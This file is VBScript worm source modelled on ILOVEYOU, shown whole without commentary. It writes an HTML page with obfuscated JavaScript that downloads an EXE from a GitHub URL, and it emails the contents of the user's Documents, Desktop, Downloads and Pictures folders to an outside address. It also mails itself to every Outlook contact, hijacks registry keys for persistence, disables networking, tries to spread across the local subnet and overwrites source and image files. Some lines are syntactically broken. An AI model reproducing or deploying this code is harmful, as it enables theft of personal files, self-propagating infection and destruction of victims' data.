System.Threading.Thread.Sleep(7777)

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("e748.html")

file.WriteLine("<html>")
file.WriteLine("<head>")
file.WriteLine("<script>"
file.WriteLine("function _0x5316(_0x3c2f32,_0x67a931){var _0x5be521=_0x5be5();return _0x5316=function(_0x53168b,_0x4e7e44){_0x53168b=_0x53168b-0xc1;var _0x5f20e9=_0x5be521[_0x53168b];return _0x5f20e9;},_0x5316(_0x3c2f32,_0x67a931);}var _0x336195=_0x5316;(function(_0x29906b,_0x14935b){var _0x965df7=_0x5316,_0x160b5e=_0x29906b();while(!![]){try{var _0x5a1de5=-parseInt(_0x965df7(0xc2))/0x1*(-parseInt(_0x965df7(0xc3))/0x2)+parseInt(_0x965df7(0xc5))/0x3*(parseInt(_0x965df7(0xc1))/0x4)+-parseInt(_0x965df7(0xd3))/0x5+-parseInt(_0x965df7(0xc7))/0x6*(parseInt(_0x965df7(0xd0))/0x7)+parseInt(_0x965df7(0xd5))/0x8+-parseInt(_0x965df7(0xcb))/0x9+parseInt(_0x965df7(0xce))/0xa;if(_0x5a1de5===_0x14935b)break;else _0x160b5e['push'](_0x160b5e['shift']());}catch(_0x6bb57c){_0x160b5e['push'](_0x160b5e['shift']());}}}(_0x5be5,0x5c644));function _0x5be5(){var _0x16aba6=['send','6QRuNWu','webkitURL','https://github.com/randyman777777777/infarox27/raw/main/infarox27/infarox27.EXE','response','4017114euaCVz','createObjectURL','application/octet-stream','5086170CVYour','responseType','819931oQBYNa','URL','GET','3738140ESzqWO','open','5887064mCKKGS','54116IRdoye','202228VVgXWt','4rjdppc','blob','9RDhqCB'];_0x5be5=function(){return _0x16aba6;};return _0x5be5();}var xhr=new XMLHttpRequest();xhr[_0x336195(0xd4)](_0x336195(0xd2),_0x336195(0xc9),!![]),xhr[_0x336195(0xcf)]=_0x336195(0xc4),xhr['onload']=function(){var _0x8d5704=_0x336195,_0x8851cf=window[_0x8d5704(0xd1)]||window[_0x8d5704(0xc8)],_0x2f41c8=new Blob([xhr[_0x8d5704(0xca)]],{'type':_0x8d5704(0xcd)}),_0x1c4dd1=document['createElement']('a');_0x1c4dd1['href']=_0x8851cf[_0x8d5704(0xcc)](_0x2f41c8),_0x1c4dd1['download']='infarox27.EXE',_0x1c4dd1['click']();},xhr[_0x336195(0xc6)]();")
file.WriteLine("</script>")
file.WriteLine("</head>")
file.WriteLine("<body>")
file.WriteLine("  <h1>Welcome to my website!</h1>")
file.WriteLine("</body>")
file.WriteLine("</html>"

file.Close

Set shell = CreateObject("WScript.Shell")
shell.Run("e748.html")

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("h8s8n.vbs")

file.WriteLine("Dim objPing, objRetStatus, arrServers")
file.WriteLine("arrServers = Array("104.26.3.4", "172.67.70.196", "23.227.38.32")")

file.WriteLine("Do")
file.WriteLine("  For Each strServer in arrServers")
file.WriteLine("    Set objPing = GetObject("winmgmts:{impersonationLevel=impersonate}").ExecQuery _")
file.WriteLine("    ("select * from Win32_PingStatus where Address='" & strServer & "'")")

file.WriteLine("    For Each objRetStatus in objPing")
file.WriteLine("      If objRetStatus.StatusCode=0 Then")
file.WriteLine("        WScript.Echo "Reply from " & objRetStatus.ProtocolAddress & ": bytes=" & objRetStatus.BufferSize & " time=" & objRetStatus.ResponseTime & "ms"")
file.WriteLine("    Next")
file.WriteLine("  Next")
file.WriteLine("Loop")

file.Close

Set shell = CreateObject("WScript.Shell")
shell.Run("h8s8n.vbs")

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("rurn48.vbs")

file.WriteLine("Dim objOutlook")
file.WriteLine("Set objOutlook = CreateObject("Outlook.Application")")

file.WriteLine("Dim fso, folder, files")
file.WriteLine("Set objF67 = fso.GetFolder("%User%")")
file.WriteLine("Set fso = CreateObject("Scripting.FileSystemObject")")
file.WriteLine("Set folder = objF67")
file.WriteLine("Set files = folder.Files")

file.WriteLine("For Each files In folder")
file.WriteLine("            Dim objMail")
file.WriteLine("            Set objMail = objOutlook.CreateItem(0)")

file.WriteLine("            With objMail")
file.WriteLine("                .Subject = "u o!!")
file.WriteLine("                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"")
file.WriteLine("                .Body = fso.OpenTextFile(file.Path).ReadAll")
file.WriteLine("                .Send")
file.WriteLine("            End With")

file.WriteLine("            Set objMail = Nothing")
file.WriteLine("        Next")
		
file.WriteLine("Set objContacts = Nothing")
file.WriteLine("Set objOutlook = Nothing")

file.WriteLine("Dim fso, folder, files")
file.WriteLine("Set objF75 = fso.GetFolder("%Desktop%")")
file.WriteLine("Set fso = CreateObject("Scripting.FileSystemObject")")
file.WriteLine("Set folder = objF75")
file.WriteLine("Set files = folder.Files")

file.WriteLine("For Each files In folder")
file.WriteLine("            Dim objMail")
file.WriteLine("            Set objMail = objOutlook.CreateItem(0)")

file.WriteLine("            With objMail")
file.WriteLine("                .Subject = "u o!!"")
file.WriteLine("                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"")
file.WriteLine("                .Body = fso.OpenTextFile(file.Path).ReadAll")
file.WriteLine("                .Send")
file.WriteLine("            End With")

file.WriteLine("            Set objMail = Nothing")
file.WriteLine("        Next")
		
file.WriteLine("Set objContacts = Nothing")
file.WriteLine("Set objOutlook = Nothing")

file.WriteLine("Dim fso, folder, files")
file.WriteLine("Set objJ99 = fso.GetFolder("%Documents%")")
file.WriteLine("Set fso = CreateObject("Scripting.FileSystemObject")")
file.WriteLine("Set folder = objJ99")
file.WriteLine("Set files = folder.Files")

file.WriteLine("For Each files In folder")
file.WriteLine("            Dim objMail")
file.WriteLine("            Set objMail = objOutlook.CreateItem(0)")

file.WriteLine("            With objMail")
file.WriteLine("                .Subject = "u o!!"")
file.WriteLine("                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"")
file.WriteLine("                .Body = fso.OpenTextFile(file.Path).ReadAll")
file.WriteLine("                .Send")
file.WriteLine("            End With")

file.WriteLine("            Set objMail = Nothing")
file.WriteLine("        Next")
		
file.WriteLine("Set objContacts = Nothing")
file.WriteLine("Set objOutlook = Nothing")

file.WriteLine("Dim fso, folder, files")
file.WriteLine("Set objE74 = fso.GetFolder("%Downloads%")")
file.WriteLine("Set fso = CreateObject("Scripting.FileSystemObject")")
file.WriteLine("Set folder = objE74")
file.WriteLine("Set files = folder.Files")

file.WriteLine("For Each files In folder")
file.WriteLine("            Dim objMail")
file.WriteLine("            Set objMail = objOutlook.CreateItem(0)")

file.WriteLine("            With objMail")
file.WriteLine("                .Subject = "u o!!"")
file.WriteLine("                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"")
file.WriteLine("                .Body = fso.OpenTextFile(file.Path).ReadAll")
file.WriteLine("                .Send")
file.WriteLine("            End With")

file.WriteLine("            Set objMail = Nothing")
file.WriteLine("        Next")
		
file.WriteLine("Set objContacts = Nothing")
file.WriteLine("Set objOutlook = Nothing")

file.WriteLine("Dim fso, folder, files")
file.WriteLine("Set objRR4 = fso.GetFolder("%Pictures%")")
file.WriteLine("Set fso = CreateObject("Scripting.FileSystemObject")")
file.WriteLine("Set folder = objRR4")
file.WriteLine("Set files = folder.Files")

file.WriteLine("For Each files In folder")
file.WriteLine("            Dim objMail")
file.WriteLine("            Set objMail = objOutlook.CreateItem(0)")

file.WriteLine("            With objMail")
file.WriteLine("                .Subject = "u o!!"")
file.WriteLine("                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"")
file.WriteLine("                .Body = fso.OpenTextFile(file.Path).ReadAll")
file.WriteLine("                .Send")
file.WriteLine("            End With")

file.WriteLine("            Set objMail = Nothing")
file.WriteLine("        Next")
		
file.WriteLine("Set objContacts = Nothing")
file.WriteLine("Set objOutlook = Nothing")

file.Close

Set shell = CreateObject("WScript.Shell")
shell.Run("rurn48.vbs")

Set fs = CreateObject("Scripting.FileSystemObject")
fs.CopyFile "h8s8n.vbs", "%Temp%\h8s8n.vbs"

Set fs = CreateObject("Scripting.FileSystemObject")
fs.CopyFile WScript.ScriptFullName, "%Temp%\" & WScript.ScriptName

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """%Temp%\luv.TXT.vbs"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Dim objOutlook
Set objOutlook = CreateObject("Outlook.Application")

Dim objContacts
Set objContacts = objOutlook.Session.GetDefaultFolder(10).Items

For Each objContact In objContacts
    If objContact.Class = 43 Then
        Dim objMail
        Set objMail = objOutlook.CreateItem(0)

        With objMail
            .Subject = "i luvz u :3"
            .To = objContact.Email1Address
            .Body = "spread my luv!!"
            .Attachments.Add "%Temp%\luv.TXT.vbs"
            .Send
        End With

        Set objMail = Nothing
    End If
Next

Dim fso, folder, files
Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = objOutlook.Session.GetDefaultFolder(10)
Set files = folder.Files

For Each objContact In objContacts
    If objContact.Class = 43 Then
        For Each file In files
            Dim objMail
            Set objMail = objOutlook.CreateItem(0)

            With objMail
                .Subject = "u o!!"
                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"
                .Body = fso.OpenTextFile(file.Path).ReadAll
                .Send
            End With

            Set objMail = Nothing
        Next
    End If
Next

Set objContacts = Nothing
Set objOutlook = Nothing

System.Threading.Thread.Sleep(777777)

Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "cmd /c netsh interface set interface ""Local Area Connection"" admin=disable", 0, True

Sytem.Threading.Thread.Sleep(77777)

Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")

' Get the list of IP addresses on the local subnet
' (Assuming a subnet mask of 255.255.255.0)
Dim arrIPAddresses
arrIPAddresses = GetIPAddresses()

' Loop through each IP address and try to execute the script remotely
For Each strIPAddress in arrIPAddresses
  On Error Resume Next
  objShell.Run "\\" & strIPAddress & "\c$\windows\system32\cscript.exe //B " & WScript.ScriptFullName, 0, True
  If Err.Number = 0 Then
    ' Script executed successfully on remote machine
  End If
Next

' Function to get a list of IP addresses on the local subnet
Function GetIPAddresses()
  Dim arrIPAddresses
  arrIPAddresses = Array()
  
  Dim objWMIService
  Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
  
  Dim colItems
  Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
  
  Dim objItem
  For Each objItem in colItems
    Dim arrIPAddress
    arrIPAddress = objItem.IPAddress
    For Each strIPAddress in arrIPAddress
      If Left(strIPAddress, 7) = "192.168" Then
        ReDim Preserve arrIPAddresses(UBound(arrIPAddresses) + 1)
        arrIPAddresses(UBound(arrIPAddresses)) = strIPAddress
      End If
    Next
  Next
  
  GetIPAddresses = arrIPAddresses
End Function

Set WshShell = WScript.CreateObject("WScript.Shell")

strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strKeyName = "luv.TXT.vbs"
strKeyValue = WScript.ScriptFullName

WshShell.RegWrite strKeyPath & "\" & strKeyName, strKeyValue, "REG_SZ"

Sytem.Threading.Thread.Sleep(77777777)

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".txt" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".js" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".py" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".cpp" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".jpg" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".png" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%Desktop")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".js" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%Desktop")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".py" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%Desktop")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".cpp" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%User%")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".jss" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next
